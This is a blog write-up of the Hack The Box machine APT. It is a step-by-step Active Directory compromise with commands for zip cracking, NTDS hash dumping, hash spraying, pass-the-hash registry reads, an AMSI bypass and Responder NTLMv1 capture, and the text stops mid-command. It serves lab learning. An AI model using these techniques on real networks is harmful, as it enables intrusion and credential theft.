---
layout: post
title:  "APT Writeup - Hack The Box"
date:   2024-06-14
desc: ""
keywords: "HTB,OSEP,OSCP,Windows,ActiveDirectory,IOXIDResolver.py,Cracking,NTDS,Kerberos,PyKerbrute,Reg.py,WindowsDefenderEvasion,NTLMv1,Responder,Secretsdump.py,Insane"
categories: [HTB]
tags: [HTB,OSEP,OSCP,Windows,ActiveDirectory,IOXIDResolver.py,Cracking,NTDS,Kerberos,PyKerbrute,Reg.py,WindowsDefenderEvasion,NTLMv1,Responder,Secretsdump.py,Insane]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/apt_writeup/APT.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I had promised myself to rest a little after the enormous work that the **[Anubis](https://alejobarto8.github.io/htb/2024/06/10/anubis-writeup.html){:target="_blank"}** box demanded from me, but the truth is that I felt the need to continue with this saga of **Active Directory** machines and I also have a reserve of energy. So I am going after the **Windows** machine, **APT**, an **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** **Insane** machine, I think because the vulnerabilities, tools and scripts (which must be customized to work) are not known to those of us who are very recently in the field of **Cybersecurity**, in addition to some tricks that are becoming known little by little. It seems to me an excellent box to learn new concepts and strengthen that sixth sense that must be acquired if we want to work in real environments. Here I go.

<br /><br />
<img src="{{ site.img_path }}/apt_writeup/APT_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once I start the machine from my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform account, as always I check that my connectivity to it is correct by sending a trace with `ping`, but it is not being sent. But if I try to check if any commonly open service (**HTTP**, **RPC**) is, from my browser <ins>I can access a web service</ins>. Everything tells me that the **IPv4** protocol is not enabled, or maybe some rule in **iptable** prevents it. But I always have **HackTricks** at hand, and in their post **["Identifying IP addresses"](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc){:target="_blank"}** they recommend me several tools to obtain the **IPv6** (in case it is not firewall rules that prevent communication). With **[IOXIDResolver.py](https://github.com/mubix/IOXIDResolver){:target="_blank"}** I can get the **IP** and send traces with `ip6` correctly, and with [`impacket-rpcmap`](https://www.secureauth.com/labs/open-source-tools/impacket/){:target="_blank"} I can also leak **DCE/RPC** interfaces.

> The **[Distributed Component Object Model (DCOM) Remote Protocol](https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-DCOM/%5bMS-DCOM%5d-171201.pdf){:target="_blank"}** is a protocol for exposing application objects by way of remote procedure calls (**RPCs**). The protocol consists of a set of extensions layered on **Microsoft Remote Procedure Call Protocol Extensions** as specified in **MS-RPCE**.

- **object exporter**: An object container (for example, process, machine, thread) in an **object server**. Object exporters are callable using **RPC** interfaces, and they are responsible for dispatching calls to the objects they contain.

- **object exporter identifier** (**OXID**): A 64-bit number that uniquely identifies an **object exporter** within an object server.

> **rpcmap.py**: Scan for listening **DCE/RPC** interfaces. This binds to the **MGMT** interface and gets a list of interface **UUIDs**. If the **MGMT** interface is not available, it takes a list of interface **UUIDs** seen in the wild and tries to bind to each interface.

> The **[STRINGBINDING](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/f4643148-d34b-4f6f-bc9b-b14aed358544){:target="_blank"}** structure describes an **RPC** protocol, a network address, and, optionally, an **RPC** endpoint for the **RPC** protocol that a client can use to communicate with either an object resolver or an object exporter.

> Protocol sequence **[ncacn_ip_tcp](https://learn.microsoft.com/en-us/windows/win32/rpc/string-binding){:target="_blank"}**: Four-octet Internet address, or host name. If the IPv6 network stack is installed, IPv6 is fully supported and an IPv6 address is also accepted.

```bash
ping -c 1 10.10.10.213                        # :(

git clone https://github.com/mubix/IOXIDResolver
pip3 install -r requirements.txt
python IOXIDResolver.py --help
python IOXIDResolver.py -t 10.10.10.213       # :)
#    Address: apt
#    Address: 10.10.10.213
#    Address: dead:beef::b885:d62a:d679:573f
#    Address: dead:beef::2de8:9302:4e52:f824
#    Address: dead:beef::ae

impacket-rpcmap --help
impacket-rpcmap 'ncacn_ip_tcp:10.10.10.213'

ping6 -n dead:beef::b885:d62a:d679:573f
ping6 -n dead:beef::2de8:9302:4e52:f824
```

<br />
<img src="{{ site.img_path }}/apt_writeup/APT_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once I solved the problem with the **IP** of the box, I can continue the **Reconnaissance** phase, with `nmap` I list the open ports and get very interesting information from what seems to be a **Domain Controller**, such as the **Computer Name** and **Domain Name** plus other little things. With `whatweb` I do an enumeration, without many good results (except for a domain **.com** that does not correspond to **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**), of the web service on port **80**.

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn -6 dead:beef::2de8:9302:4e52:f824 -oG allPorts
nmap -6 -sCV -p53,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49674,49695,64653 dead:beef::2de8:9302:4e52:f824 -oN targetedIPv6

whatweb http://10.10.10.213
# -> sales@gigantichosting.com      :( not in /etc/hosts       is .com!!!
```

<br />
<img src="{{ site.img_path }}/apt_writeup/APT_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before I focus on the port **80** web service, I am going to get information with `crackpamexec` about the **Domain Controller** which does not give me much information than I had except that the **SMB** is signed (a good practice). To avoid entering the **IPv6** in every command, I will add the **Domain Name** and **Computer Name** to my `hosts` configuration file and with **ping6** check that the new configuration works correctly. With `dig` I can look a bit into the **DNS** protocol on port **53** but I don't find much and it is not vulenarable to **[Asynchronous Full Transfer Zone](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns){:target="_blank"}** (**AXFR**). With `smbclient` I find an interesting **backup** resource, with `smbmap` I have problems to access (I guess it is due to the **IP**) so with `socat` I create a tunnel that redirects all the requests made to my port **445** to port **445** of the victim machine and everything is solved.

```bash
crackmapexec smb 10.10.10.213                                       # :(
crackmapexec smb dead:beef::2de8:9302:4e52:f824
nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping6 -n apt                                                        # :)
ping6 -n htb.local                                                  # :)

dig 10.10.10.213
dig 10.10.10.213 ns
dig 10.10.10.213 mx
dig 10.10.10.213 axfr

smbclient -L dead:beef::2de8:9302:4e52:f824 -N
smbclient -L apt -N
smbmap -H dead:beef::2de8:9302:4e52:f824 -u 'null' --no-banner      # :(

# Tip: create a tunel with socat
socat TCP-LISTEN:445,fork TCP:apt:445
crackmapexec smb localhost                                          # :)
smbmap -H localhost -u 'null' --no-banner                           # ??
smbclient -L localhost -N
```

<br />
<img src="{{ site.img_path }}/apt_writeup/APT_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `smbclient` I have problems when trying to download the file, I had already experienced this problem on a previous machine, I think it is due to the size. So just by [adding some parameters I can download it](https://unix.stackexchange.com/questions/31900/smbclient-alternative-for-large-files){:target="_blank"}, if I analyze it with `file` I confirm that it is a compressed file but I need a password if I try to extract the data with `unzip`. So I can use `fcrackzip` to crack it (**once installed of course**) and after waiting only a few seconds I get what I need. Once the files are unzipped I find that they correspond to the memory password hashes dump, but since they correspond to an **Active Directory** I will need **SYSTEM** and **ntds.dit** to [get the hashes with `impacket-secretsdump`](https://book.hacktricks.xyz/windows-hardening/stealing-credentials){:target="_blank"}.

> **NTDS** (**Windows NT Directory Services**) is the directory services used by **Microsoft Windows NT** to locate, manage, and organize network resources. The **NTDS.dit** file is a database that stores the **Active Directory** data (including users, groups, security descriptors and password hashes).

> Impacket's **secretsdump.py** will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading **SAM** and **LSA secrets** from registries, dumping **NTLM** hashes, plaintext credentials, and **kerberos** keys, and dumping **NTDS**.

```bash
smbclient //localhost/backup -N
    > dir
    # --> backup
    > get backup
    # --> parallel_read returned NT_STATUS_IO_TIMEOUT           Size?

smbclient //dead:beef::b885:d62a:d679:573f/backup -N -m SMB2 -c 'timeout 120; iosize 16384; get backup.zip'
file backup.zip
# --> Zip archive data
unzip backup.zip                                                        # Password?
sudo apt search fcrackzip
sudo apt install fcrackzip
fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt backup.zip       # :)
#    --> iloveyousomuch

# Or can use too:
# zip2john backup.zip

impacket-secretsdump --help
#    --> -system SYSTEM        SYSTEM hive to parse
#    --> -ntds NTDS            NTDS.DIT file to parse
#    --> LOCAL (if you want to parse local files)

impacket-secretsdump LOCAL -ntds Active\ Directory/ntds.dit -system registry/SYSTEM
```

<br />
<img src="{{ site.img_path }}/apt_writeup/APT_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have the **Domain usernames** and **passwords** I am going to take advantage of the **Kerberos** service available (port **88**) and use [`kerbrute`](https://github.com/ropnop/kerbrute){:target="_blank"} to check which ones are valid.  First I have to sort a bit the information to create a file with only the usernames and then run the script, I get that <ins>three accounts are correct</ins>, but if I use `crackmapexec` to now validate the user and its corresponding hash I don't have satisfactory results. So I think of taking each valid username from the domain and try with all the hashes I have available, but at some point the requests are blocked, maybe due to some security configuration to avoid brute force attacks.

> To enumerate usernames, **Kerbrute** sends **TGT** requests with no pre-authentication. If the **KDC** responds with a **PRINCIPAL UNKNOWN** error, the username does not exist. However, if the **KDC** prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts. This generates a **Windows** event **ID 4768** if Kerberos logging is enabled.

```bash
impacket-secretsdump LOCAL -ntds Active\ Directory/ntds.dit -system registry/SYSTEM | grep aad3b435b51404eeaad3b435b51404ee
impacket-secretsdump LOCAL -ntds Active\ Directory/ntds.dit -system registry/SYSTEM | grep aad3b435b51404eeaad3b435b51404ee > hashes
ncat hashes
cat hashes | awk '{print $1}' FS=':'
cat hashes | awk '{print $1}' FS=':' | sort -u > users.txt

cat ../nmap/targetedIPv6 | grep kerberos
kerbrute --help
#     --> userenum      Enumerate valid domain usernames via Kerberos
#     -->  --dc string          The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
#     --> -d, --domain string      The full domain to use (e.g. contoso.com)
kerbrute userenum -d htb.local users.txt
#   --> Couldn't find any KDCs for realm HTB.LOCAL. Please specify a Domain Controller
kerbrute userenum --dc apt -d htb.local users.txt
#   --> APT$@htb.local
#   --> Administrator@htb.local
#   --> henry.vinson@htb.local

cat hashes | grep -E 'APT|Administrator|henry.vinson'
crackmapexec smb apt -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe
crackmapexec smb apt -u 'APT$' -H b300272f1cdab4469660d55fe59415cb
crackmapexec smb apt -u 'henry.vinson' -H 2de80758521541d19cabba480b260e8f
crackmapexec smb --help
#   --> -H HASH [HASH ...], --hash HASH [HASH ...] NTLM hash(es) or file(s) containing NTLM hashes

cat hashes | awk '{print $4}' FS=":" | sort -u > hashntlmv1
crackmapexec smb apt -u 'henry.vinson' -H hashntlmv1
#    --> The NETBIOS connection with the remote host timed out.        :(
```

<br />
<img src="{{ site.img_path }}/apt_writeup/APT_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As usual I find most of my answers on **[HackTricks](https://book.hacktricks.xyz/){:target="_blank"}**, which informs me that `kerbrute` often [cannot work in Password Spraying/Brute Force attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying){:target="_blank"}, but if I search on **Github** for a project to perform brute force attacks against **Kerberos** I find the **[pyKerbrute](https://github.com/3gstudent/pyKerbrute){:target="_blank"}** project which has the **ADPwdSpray.py** script that will help me to solve the problem of finding some hash for the **Domain Controller username**. The script has some problems as it is intended and coded to use a list of users and a single hash, instead I need to reverse this logic. But if I run the script to test it I have some problems to solve previously, not very complicated, since it is not finding some libraries related to **Cryptography**, but that come with the project so I just have to modify the path. The second problem I could solve it analyzing a little the code, when it passes in the second parameter the **IPv6** (**apt**) it generates a problem because in one of the implemented functions, it only accepts **IPv4**, so I only have to modify 2 lines and ready, the script is now working but I must customize it.

> **pyKerbrute**: Use python to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. **Kerbrute** validates a username or test a login by only sending one **UDP** frame to the **KDC** (**Domain Controller**). **PyKerbrute** adds support for **TCP** and the **NTLM** hash of Active Directory accounts.

> **ADPwdSpray.py**: Use **Kerberos** pre-authentication to test a single password or **NTLM** hash against a list of Active Directory accounts.

```bash
git clone https://github.com/3gstudent/pyKerbrute
python3 ADPwdSpray.py
python2 ADPwdSpray.py
#   --> TabError: inconsistent use of tabs and spaces in indentation      Python :(

python2 ADPwdSpray.py
#   --> No module named Crypto.Cipher

nvim ADPwdSpray.py
#   --> from Crypto.Cipher import ARC4
#   --> from Crypto.Cipher import MD4, MD5

python2 ADPwdSpray.py apt htb.local ../users.txt ntlmhash 2de80758521541d19cabba480b260e8f tcp
#   --> send_req_tcp
#   --> sock.connect((kdc, port))

nvim ADPwdSpray.py
# :%s/AF_INET/AF_INET6/g
```

<br />
<img src="{{ site.img_path }}/apt_writeup/APT_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have to customize the script to perform a brute force attack but using a single Domain username and a list of hashes. I have some problems with some libraries that I don't have installed, like **pwntools** (which with its status bars help me a lot in tracking an exploit), but I must install `pip2` first since I am running the script with `python2`. Once all the problems are solved I can run the script and I get a positive match, which with `crackmapexec` I can validate. Unfortunately the credentials are not useful to access via **WinRM**, but with `rpcclient` I can list some information and check that the **Domain admins Group** only has the user **Administrator** as the only valid account.

> **[Pwntools](https://pypi.org/project/pwntools/){:target="_blank"}** is a CTF framework and exploit development library. Written in **Python**, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.

```bash
nvim ADPwdSpray.py
python2 ADPwdSpray.py apt htb.local 'henry.vinson'      # :(

mv ~/Downloads/get-pip.py .
chmod +x get-pip.py
python2.7 get-pip.py
pip2 install --upgrade setuptools
sudo apt-get install python-dev -y
pip2 install pwntools

python2 ADPwdSpray.py apt htb.local 'henry.vinson'
#   --> [+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb

crackmapexec smb apt -u 'henry.vinson' -H e53d87d42adaa3ca32bdb34a876cbffb
crackmapexec winrm apt -u 'henry.vinson' -H e53d87d42adaa3ca32bdb34a876cbffb      :(

rpcclient -U "" apt -N
    $> enumdomusers           # :(
rpcclient --help
#   --pw-nt-hash                             The supplied password is the NT hash
rpcclient -U "henry.vinson" apt --pw-nt-hash
    $> enumdomusers           # :)
    $> enumdomgroups

rpcclient -U "henry.vinson" apt --pw-nt-hash -c "querygroupmem 0x200"
rpcclient -U "henry.vinson" apt --pw-nt-hash -c "queryuser 0x1f4"
```

<br />
<img src="{{ site.img_path }}/apt_writeup/APT_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I try to get a **TGT** without knowing my password with `GetNPUsers.py`, I don't succeed because **Kerberos** requires me to be authenticated. I don't have many ideas left to continue listing, so thanks to the ever-present help of **HackTricks**, since I have a username and its hash I can read the **Windows Registry** remotely using **[Reg.py](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb){:target="_blank"}**. So in my machine I have `impacket-reg` and I can begin to read the different **Hives** of the Registry, I must be careful because I must put double `\` in some cases, because it deletes one and generates me a reading error. After a long time of exploring it finds a very strange key because its name is of the Software that is offered in the port **80** of the **HTTP** protocol, if I read its content I find a username and its password. I immediately validate it with `crackmapexec` and the best thing is that I can access the victim machine through the **WinRM** protocol with `evil-winrm`.

> **[GetNPUsers.py](https://tools.thehacker.recipes/impacket/examples/getnpusers.py){:target="_blank"}** can be used to retrieve domain users who have **"Do not require Kerberos preauthentication"** <ins>set</ins> and ask for their **TGTs** without knowing their passwords. It is then possible to attempt to crack the session key sent along the ticket to retrieve the user password.

```bash
impacket-GetNPUsers htb.local/henry.vinson -no-pass                                     # :(
impacket-GetNPUsers htb.local/henry.vinson -hashes :e53d87d42adaa3ca32bdb34a876cbffb    # :(

impacket-reg --help
#   --> target  [[domain/]username[:password]@]<targetName or address>
#   --> query   Returns a list of the next tier of subkeys and entries that are located under a specified subkey in the registry.
#   --> -hashes LMHASH:NTHASH

impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKU
# Don't use -s <-- is crazy
impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKCU\Console
impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName 'HKCU\Control Panel'
impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKCU\Environment

impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKCU\Console
impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKCU\\Console
impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKCU\\Environment
impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKCU\\Network
impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKCU\\Software
impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKCU\\Software\\GiganticHostingManagementSystem
# :) Credentials !

crackmapexec smb apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'      # :)
crackmapexec winrm apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
evil-winrm -i apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'

whoami
hostname
ipconfig
```

<br />
<img src="{{ site.img_path }}/apt_writeup/APT_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now on the victim machine I can already access the first flag to demonstrate on the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform the compromise of the box, I also use some **Reconnaissance** commands to know what information I have, I find that there are two user accounts in addition to those created by default, so maybe I should perform a **User Pivoting** or not. I explore the directories where sensitive information can be found but I am not going to waste a lot of time blindly, so I am going to resort to **[WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
){:target="_blank"}**, but if I transfer it to the machine it generates conflicts with **Windows Defender**, the good thing about `evil-winrm` is that it has some options that allow me to perform a bypass as **Bypass-4MSI** (patchs AMSI protection) and invoke the **[WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS){:target="_blank"}** binary directly. I find a lot of interesting information, but the most striking is that the **Domain Controller** has support for **NTLMv1** (which is **[vulnerable to being cracked](https://book.hacktricks.xyz/windows-hardening/ntlm){:target="_blank"}**), in the other files I don't find much.

> **NTLMv1**. The server authenticates the client by sending an 8-byte random number, the **challenge**. The client performs an operation involving the **challenge** and a **secret** shared between client and server. The client returns the 24-byte result of the computation.

> **NTLMv1** uses a weak **DES** encryption algorithm that is fast to decrypt, making it vulnerable to brute-forcing, while **NTLMv2** uses the slower **HMAC-MD5** that can better resist these attacks, since decrypting can’t take place in real time.

> **NTLMv1 Challenge**: The challenge length is 8 bytes and the response is 24 bytes long. The hash **NT** (16bytes) is divided in 3 parts of 7bytes each (7B + 7B + (2B+0x00*5)): the last part is filled with zeros. Then, the **challenge** is ciphered separately with each part and the resulting ciphered bytes are joined. Total: 8B + 8B + 8B = 24Bytes.

> Problems:

- Lack of randomness
- The 3 parts can be attacked separately to find the NT hash
- DES is crackable
- The 3º key is composed always by 5 zeros.

> Given the same challenge the response will be same. So, you can give as a challenge to the victim the string "**1122334455667788**" and attack the response used precomputed rainbow tables.

> **Victime Machine**:

```cmd
whoami /priv
whoami /all
net users
net user henry.vinson_adm
#   --> *Remote Management Use
...

systeminfo      # :(
systemInfo      # :(
```

> **Attacker Machine**:

```bash
mv ~/Downloads/winPEASany.exe ./winPEAS.exe
```

> **Victime Machine**:

```cmd
upload winPEAS.exe
.\winPEAS.exe                     # :( Windows Defender

menu
Bypass-4MSI

Invoke-Binary winPEAS.exe

#    --> Analyzing Windows Files Files (limit 70)
# C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

#    --> Enumerating NTLM Settings
# [!] NTLM clients support NTLMv1!
# [!] NTLM services on this machine support NTLMv1!

#    --> Unattend Files
# C:\Windows\Panther\Unattend.xml

#    --> Found Windows Files
# C:\Users\All Users\USOShared\Logs\System
# C:\Users\henry.vinson_adm\NTUSER.DAT
# C:\Users\Default\NTUSER.DAT

type C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Windows\Panther\Unattend.xml
type 'C:\Users\All Users\USOShared\Logs\System'       # :(
type C:\Users\henry.vinson_adm\NTUSER.DAT             # :(
type C:\Users\Default\NTUSER.DAT                      # :(
```

<br />
<img src="{{ site.img_path }}/apt_writeup/APT_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There is another tool recommended by **HackTricks**, **[`Seatbelt.exe`](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation){:target="_blank"}**, that once invoked from `evil-winrm` <ins>confirms me</ins> of the vulnerability that I may be able to [exploit to escalate privileges](https://trustedsec.com/blog/practical-attacks-against-ntlmv1){:target="_blank"}. The attack consists of capturing the **NTLMv1** Hash to be able to crack it (since it is possible through online tools and even with `hashcat`), but I must first can get the **Domain Controller** to communicate with my attacking machine, and I can do this by [taking advantage of **Windows Defender** being enabled and using its tool `MpCmdRun.exe`](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse){:target="_blank"}, which allows to analyze threats. After making the necessary modifications in the **Responder** configuration file (modify the value of the **chalenge**, so that it is not random but a static and special one) and run it with the **--lm** parameter (to support **NTLMv1**), I can only run `MpCmdRun.exe` from my `evil-winrm` session and I can capture the hash.

> **[SeatBelt](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries){:target="_blank"}** -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc).

> **mpcmdrun.exe** is an important part of **Microsoft's Windows Security system** that helps protect your PC from online threats and malware. You can also use this utility if you'd like to automate **Microsoft Security Antivirus**. The **.exe** must be run from the Windows command prompt.

> **Attacker Machine**:

```bash
mv ~/Downloads/Seatbelt.exe .
```

> **Victime Machine**:

```cmd
Invoke-Binary Seatbelt.exe
Invoke-Binary Seatbelt.exe -group=all

# ====== NTLMSettings ======
#      [!] NTLM clients support NTLMv1!          <-- Confirmed !
```

> **Attacker Machine**:

```bash
cd /usr/share/responder
nvim Responder.conf
#   --> Challenge = Random <--> 1122334455667788
responder -I tun0 --lm
```

> **Victime Machine**:

```cmd
cd C:\
cd PROGRA~1
